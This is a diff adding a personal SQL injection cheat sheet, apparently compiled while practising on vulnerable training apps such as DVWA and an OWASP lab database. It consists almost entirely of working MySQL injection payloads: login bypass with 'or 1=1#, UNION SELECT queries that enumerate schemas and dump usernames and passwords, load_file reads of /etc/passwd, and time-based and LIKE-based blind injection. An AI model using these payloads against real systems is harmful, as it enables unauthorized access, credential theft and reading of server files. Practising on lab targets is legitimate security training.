@@ -1,0 +1,67 @@
+payloads;
+
+
+bypass authentication(login as admin):
+'or 1=1#
+
+bypass authentication(login as any user):
+[user_name] '#
+
+
+functions;
+database() = current_db check
+user() = current_user check
+version() server-version check
+load_file("file path") = read_file
+
+
+Determining number of columns;
+faysal'order by 5#
+faysal'order by 1,2,3,4,5#
+
+
+db,user&version check;
+faysal'Union select null,database(),user(),version(),null#
+Result:
+db=owasp10
+user= root@localhost
+version= 5....
+
+read local file;
+faysal'Union select  1,database(),user(),load_file('/etc/passwd'),5#
+
+
+retrieving_tables from owasp10 db;
+faysal'Union select  1,column_name,null,null,null from information_schema.columns where table_name="accounts" and table_schema='owasp10'#
+
+faysal' union select cid,username,mysignature,is_admin,password from accounts# 
+
+
+'or 1=1#
+'or 1=2#
+true=true
+true=false
+
+
+
+BLIND SQLi
+
+1'or sleep(5)#
+1'or 1=1#
+1' or sleep(2) ===> 10sec
+1' order by 2#
+1' union select database(),user()#
+result;
+dvwa == current-db
+root@localhost current-user
+
+'union select table_name,null from information_schema.tables#  ===> (all tables in the dbs)
+
+'union select table_name,null from information_schema.tables where table_schema="dvwa"#  ===> (all tables in the dvwa_db)
+
+'union select column_name,null from information_schema.columns where table_name="users" and table_schema="dvwa"#    ===> (all columns in the dvwa_db)
+
+' union select user,password from users#  ====> ()
+
+1' and database() like'd%      ====> retrieve database name using like operator(we can retrieve other datas)
+
